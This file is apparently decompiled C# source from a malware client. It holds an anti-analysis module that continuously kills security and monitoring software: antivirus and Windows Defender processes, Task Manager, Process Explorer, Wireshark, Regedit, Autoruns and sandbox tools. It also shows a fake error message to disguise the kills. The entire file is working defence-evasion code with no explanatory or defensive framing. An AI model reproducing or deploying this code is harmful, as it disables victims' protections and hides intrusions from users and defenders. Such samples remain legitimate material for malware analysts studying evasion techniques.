using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Client;

[StandardModule]
public sealed class PR
{
	public class domen
	{
		private static string[] Titles = new string[36]
		{
			"ApateDNS", "Malwarebytes Anti-Malware", "Malwarebytes Anti-Malware", "TCPEye", "SmartSniff", "Active Ports", "ProcessEye", "MKN TaskExplorer", "CurrPorts", "System Explorer",
			"DiamondCS Port Explorer", "VirusTotal", "Metascan Online", "Speed Gear", "The Wireshark Network Analyzer", "Sandboxie Control", "ApateDNS", ".NET Reflector", "jotti", "novirusthanks",
			"eset", "bitdefender", "kaspersky", "f-secure", "awaps", "bitdefender", "symantec", "mcafee", "virusinfo", "malwarebytes",
			"drweb", "malc0de", "nomoreransom", "safezone", "antiwinlocker", "nanoav"
		};

		public static object Start()
		{
			object result = default(object);
			try
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					Bypass(x: true);
				});
				thread.IsBackground = true;
				thread.Priority = ThreadPriority.Lowest;
				thread.Start();
				result = true;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static object Bypass(bool x)
		{
			//IL_005d: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				while (x)
				{
					string[] titles = Titles;
					foreach (string value in titles)
					{
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							if (process.MainWindowTitle.Contains(value))
							{
								process.Kill();
								Interaction.MsgBox((object)("The application failed to initialize properly(0xc00" + Random2(4) + "). Click OK to terminate the application."), (MsgBoxStyle)Conversions.ToInteger(process.MainWindowTitle), (object)null);
							}
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Interaction.MsgBox((object)("The application failed to initialize properly(0xc00" + Random2(4) + "). Click OK to terminate the application."), (MsgBoxStyle)0, (object)"svchost.exe");
				ProjectData.ClearProjectError();
			}
			return "";
		}

		public static string Random2(int numberChar)
		{
			string source = "1234567890";
			return new string(source.OrderBy((char n) => Guid.NewGuid()).Take(numberChar).ToArray());
		}
	}

	private static Thread thread_0 = new Thread(smethod_1);

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static bool bool_0;

	public static bool Enabled
	{
		[CompilerGenerated]
		get
		{
			return bool_0;
		}
		[CompilerGenerated]
		set
		{
			bool_0 = value;
		}
	}

	public static void smethod_0()
	{
		try
		{
			Enabled = true;
			thread_0.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		try
		{
			while (Enabled)
			{
				IntPtr intptr_ = CreateToolhelp32Snapshot(2u, 0u);
				PROCESSENTRY32 processentry32_ = default(PROCESSENTRY32);
				processentry32_.uint_0 = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
				if (Process32First(intptr_, ref processentry32_))
				{
					do
					{
						uint uint_ = processentry32_.uint_2;
						string string_ = processentry32_.string_0;
						if (smethod_2(string_, "Taskmgr.exe") || smethod_2(string_, "ProcessHacker.exe") || smethod_2(string_, "procexp.exe") || smethod_2(string_, "procexp64.exe") || smethod_2(string_, "SpyTheSpy.exe") || smethod_2(string_, "SpeedGear.exe") || smethod_2(string_, "mbam.exe") || smethod_2(string_, "wireshark.exe") || smethod_2(string_, "apateDNS.exe") || smethod_2(string_, "MSASCui.exe") || smethod_2(string_, "cports.exe") || smethod_2(string_, "KeyScrambler.exe") || smethod_2(string_, "TiGeR-Firewall.exe") || smethod_2(string_, "xn5x.exe") || smethod_2(string_, "Tcpview.exe") || smethod_2(string_, "IPBlocker.exe") || smethod_2(string_, "MsMpEng.exe") || smethod_2(string_, "MpUXSrv.exe") || smethod_2(string_, "MpCmdRun.exe") || smethod_2(string_, "NisSrv.exe") || smethod_2(string_, "ConfigSecurityPolicy.exe") || smethod_2(string_, "MSConfig.exe") || smethod_2(string_, "Regedit.exe") || smethod_2(string_, "UserAccountControlSettings.exe") || smethod_2(string_, "taskkill.exe") || smethod_2(string_, "smsniff.exe") || smethod_2(string_, "exeinfoPE.exe") || smethod_2(string_, "regshot.exe") || smethod_2(string_, "RogueKiller.exe") || smethod_2(string_, "Reflector.exe") || smethod_2(string_, "taskmgr.exe") || smethod_2(string_, "NetworkMiner.exe") || smethod_2(string_, "capsa.exe") || smethod_2(string_, "AdvancedProcessController.exe") || smethod_2(string_, "ProcessLassoLauncher.exe") || smethod_2(string_, "SystemExplorer.exe") || smethod_2(string_, "ProcessLasso.exe") || smethod_2(string_, "RegWorkshopX64.exe") || smethod_2(string_, "RegWorkshopX.exe") || smethod_2(string_, "Autoruns64.exe") || smethod_2(string_, "autorunsc64.exe") || smethod_2(string_, "autorunsc.exe") || smethod_2(string_, "Autoruns.exe"))
						{
							smethod_3(uint_);
						}
					}
					while (Process32Next(intptr_, ref processentry32_));
				}
				CloseHandle(intptr_);
				Thread.Sleep(50);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static bool smethod_2(string string_0, string string_1)
	{
		return string_0.EndsWith(string_1, StringComparison.InvariantCultureIgnoreCase);
	}

	private static void smethod_3(uint uint_0)
	{
		try
		{
			IntPtr intptr_ = OpenProcess(1u, bool_1: false, uint_0);
			TerminateProcess(intptr_, 0);
			CloseHandle(intptr_);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateToolhelp32Snapshot(uint uint_0, uint uint_1);

	[DllImport("kernel32.dll")]
	private static extern bool Process32First(IntPtr intptr_0, ref PROCESSENTRY32 processentry32_0);

	[DllImport("kernel32.dll")]
	private static extern bool Process32Next(IntPtr intptr_0, ref PROCESSENTRY32 processentry32_0);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(uint uint_0, bool bool_1, uint uint_1);

	[DllImport("kernel32.dll")]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32.dll")]
	private static extern bool TerminateProcess(IntPtr intptr_0, int int_0);
}
